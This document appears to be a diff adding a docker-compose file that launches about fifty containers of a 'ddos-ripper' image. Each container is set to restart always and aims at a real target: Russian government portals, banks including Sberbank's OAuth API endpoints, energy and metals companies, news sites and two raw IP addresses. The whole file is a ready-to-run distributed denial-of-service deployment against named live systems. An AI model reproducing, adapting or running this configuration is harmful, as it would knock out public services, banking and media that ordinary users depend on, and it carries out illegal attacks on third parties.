@@ -1,0 +1,214 @@
+version: '3'
+services:
+  ddos-runner-1:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.gazprom.ru
+  ddos-runner-2:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://lukoil.ru
+  ddos-runner-3:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://magnit.ru
+  ddos-runner-4:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.nornickel.com
+  ddos-runner-5:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.surgutneftegas.ru
+  ddos-runner-6:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.tatneft.ru
+  ddos-runner-7:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.evraz.com/ru
+  ddos-runner-8:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://nlmk.com
+  ddos-runner-9:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.sibur.ru
+  ddos-runner-10:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.severstal.com
+  ddos-runner-12:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://nangs.org
+  ddos-runner-13:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://rmk-group.ru/ru
+  ddos-runner-14:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.tmk-group.ru
+  ddos-runner-15:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://ya.ru
+  ddos-runner-16:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.polymetalinternational.com/ru
+  ddos-runner-17:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.uralkali.com/ru
+  ddos-runner-18:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.eurosib.ru
+  ddos-runner-19:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://omk.ru
+  ddos-runner-20:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.sberbank.ru
+  ddos-runner-21:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.vtb.ru
+  ddos-runner-22:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.gazprombank.ru
+  ddos-runner-23:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.gosuslugi.ru
+  ddos-runner-24:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.mos.ru/uslugi
+  ddos-runner-25:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: http://kremlin.ru
+  ddos-runner-26:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: http://government.ru
+  ddos-runner-27:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://mil.ru
+  ddos-runner-28:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.nalog.gov.ru
+  ddos-runner-29:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://customs.gov.ru
+  ddos-runner-30:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://pfr.gov.ru
+  ddos-runner-31:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://rkn.gov.ru
+  ddos-runner-32:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://109.207.1.118
+  ddos-runner-33:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://109.207.1.97
+  ddos-runner-34:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.tinkoff.ru
+  ddos-runner-35:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://mail.rkn.gov.ru
+  ddos-runner-36:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://cloud.rkn.gov.ru
+  ddos-runner-37:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://mvd.gov.ru
+  ddos-runner-38:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://pwd.wto.economy.gov.ru
+  ddos-runner-39:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://stroi.gov.ru
+  ddos-runner-40:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://proverki.gov.ru
+  ddos-runner-41:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://ria.ru
+  ddos-runner-42:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://gazeta.ru
+  ddos-runner-43:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://kp.ru
+  ddos-runner-44:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://riafan.ru
+  ddos-runner-45:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://pikabu.ru
+  ddos-runner-46:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://kommersant.ru
+  ddos-runner-47:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://mk.ru
+  ddos-runner-48:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://yaplakal.com
+  ddos-runner-49:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://rbc.ru
+  ddos-runner-50:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://bezformata.com
+  ddos-runner-51:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://api.developer.sber.ru/product/SberbankID
+  ddos-runner-52:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://api.sberbank.ru/prod/tokens/v2​/oauth
+  ddos-runner-53:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://api.sberbank.ru/prod/tokens/v2​/oidc
+  ddos-runner-54:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://shop-rt.com
